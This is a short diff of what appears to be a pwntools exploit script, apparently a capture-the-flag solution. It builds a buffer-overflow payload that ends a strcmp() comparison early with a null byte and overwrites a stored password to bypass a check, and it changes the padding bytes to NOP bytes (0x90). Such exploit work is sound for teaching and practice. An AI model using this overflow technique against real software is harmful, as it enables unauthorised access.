@@ -21,11 +21,11 @@ payload = flat(
 	# input_password
 	b"A"*1, # Our new set password 
 	b"\x00"*1, # strcmp() null byte terminal
-	b"B"*14, # padding
+	b"\x90"*14, # padding
 	# password overwrite
 	b"A"*1,
 	b"\x00"*1,
-	b"B"*14
+	b"\x90"*14
 )
 p.sendline(payload)
 p.interactive()
